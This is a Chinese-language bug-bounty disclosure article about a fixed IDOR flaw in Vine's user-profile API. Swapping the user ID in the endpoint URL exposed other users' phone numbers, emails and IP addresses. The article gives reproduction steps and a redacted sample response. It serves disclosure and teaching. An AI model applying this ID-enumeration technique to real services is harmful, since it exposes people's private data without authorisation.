***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

**![1542864282_5bf63d9a1ca8a.jpeg](https://image.3001.net/images/20181122/15428726448943.jpeg!small)**

 **大家好，今天我要和大家分享的是，Twitter旗下免费移动应用Vine的用户隐私泄露漏洞一例，该漏洞由孟加拉国安全研究员 Prial Islam
发现，漏洞原因在于不安全的直接对象引用（IDOR），攻击者可利用该漏洞获取任何Vine的IP地址、手机号码和注册邮箱等个人敏感信息。漏洞最终被Twitter官方奖励了$7560美金。**  

## 漏洞说明

存在漏洞的服务端：

> <https://vine.co/api/users/profiles/><User Id>

当我在测试Vine网站的子域名时，偶然发现在上述服务端的响应内容中，包含了我账户相关的所有个人信息，我想了想，可能因为我是登录账户状态，这种应该也算正常；

之后，我又检查了跨域资源共享机制（CORS），看看是否存在错误配置情况，但也没发现任何异常；

接着，我尝试把User-ID值变化为其它随机数，这一变，不得了啦，竟然获得了其他人的所有相关信息，也就是说，只要把User-ID值变为其它用户对应的User-ID，那么，我就可以获得任何Vine用户的所有个人注册信息了，震惊了我！

## 漏洞复现

1.前提是，你要先针对某个目标用户，收集到他的User-ID值，收集方法可能有其翻他的Vine主页，或是和他发消息，等等，这里就不再赘述；

2.把目标用户User-ID值放到链接<https://vine.co/api/users/profiles/><User Id>中替换掉<User
Id>部份，访问链接，在响应内容中你就会得到目标用户的所有个人注册信息，Response的响应内容如下：

    
    
    {“code”: “”, “data”: {“followerCount”: 16271364, “includePromoted”: 1, “captchaSucceeded”: 0, “recordComment”: null, “locale”: “iUS”, “shareUrl”: “<https://vine.co/>████████”, “hiddenPhoneNumber”: 0, “notPorn”: 0, “userId”:    █████████, “private”: 0, “likeCount”: null, “commentCount”: null, “platforms”: [“android”, “ios”], “postCount”: null, “profileBackground”: “0x33ccbf”, “suspended”: null, “hiddenFacebook”: 0, “verifiedEmail”: 0, “explicitContent”: 0, “dmcaStrikeCount”:    0, “flaggedCount”: 7579, “verified”: 1, “loopCount”: 6132344784, “avatarUrl”: “<http://v.cdn.vine.co/r/avatars/>████████████████████████████████████████.jpg?versionId=JIjnvXTkbWpjvk7glYZIXDqt187couHr”, “authoredPostCount”:    598, “review_result_illegal_review”: 0, “review_result_ok”: 0, “review”: null, “suspendedBy”: null, “twitterId”: ████████, “phoneNumber”: “██████████”, “location”: “Los Angeles California”, “notifyActivity”: 1, “facebookConnected”: 1, “explicitContentAdmin”:    0, “statsTags”: null, “hiddenEmail”: 0, “unflaggable”: 0, “username”: “████████”, “modified”: “2017–01–29T01:24:00.000000”, “userIdStr”: “████████”, “twitterIdStr”: “████████”, “vanityUrls”: [“kingbach”], “remixDisabled”: 0, “deleted”: null, “categories”:    null, “released”: 0, “loopVelocity”: null, “strikeCounts”: [{“count”: 0, “strikeType”: “SEVERE_POLICY_VIOLATION”}, {“count”: 0, “strikeType”: “DMCA”}, {“count”: 0, “strikeType”: “SENSITIVE”}, {“count”: 0, “strikeType”: “POSSIBLY_ILLEGAL”}, {“count”:    0, “strikeType”: “GRAPHIC_NON_VIOLATING”}, {“count”: 0, “strikeType”: “ESC”}], “uploadHD”: 1, “verifiedPhoneNumber”: 1, “hiddenTwitter”: 0, “vineVerified”: 1, “notifyMessages”: 1, “needsPhoneVerification”: 0, “repostCount”: null, “twitterScreenname”:    “██████”, “secondaryColor”: “0x33ccbf”, “twitterVerified”: 1, “captchaRequired”: 0, “edition”: null, “acceptsOutOfNetworkConversations”: 1, “disableAddressBook”: 1, “description”: “Instagram/Twitter/Shots/SnapChat- @███ For booking go to the library”,    “escStrikeCount”: 0, “review_result_explicit”: 0, “notificationsLastViewed”: “2016–04–26T21:03:35.000000”, “email”: “████████”, “hideFromPopular”: 0, “admin”: 0, “contentReview”: 0, “created”: “2013–04–13T19:30:31.000000”, “review_result_illegal_confirmed”:    0, “followingCount”: null, “lastLogin”: “2016–12–13T23:29:40.000000”, “escUser”: 0, “ipAddress”: “██████”, “twitterConnected”: 1}, “success”: true, “error”: “”}

仔细看看上面响应内容中的信息，你会发现，其中包含了大量个人注册信息（都已作了隐藏），如下：

> “platforms”: [“android”, “ios”]
>
> “flaggedCount”: 7579
>
> “twitterId”: “█████████”
>
> “phoneNumber”: “█████”
>
> “location”: “Los Angeles California”
>
> “modified”: “2017–01–29T01:24:00.000000”
>
> “notificationsLastViewed”: “2016–04–26T21:03:35.000000”
>
> “email”: “█████████”
>
> “created”: “2013–04–13T19:30:31.000000”
>
> “lastLogin”: “2016–12–13T23:29:40.000000”
>
> “ipAddress”: “█████”

## 漏洞影响

攻击者只需利用IP地址、邮箱地址和手机号码就能大作文章，当然了，也能发起对Vine用户的大肆个人收集活动，Vine用户的个人隐私和信息安全面临威胁。另外，这还会影响到Vine用户关联的Twitter账户，因为Vine中允许用户用Twitter账户身份间接登录进入。

更多信息，请参考原漏洞报告 - <https://hackerone.com/reports/202823>

***参考来源：[medium](https://medium.com/bugbountywriteup/vine-users-private-information-disclosure-f1c55a3abbb6)，clouds编译，转载请注明来自FreeBuf.COM  
**

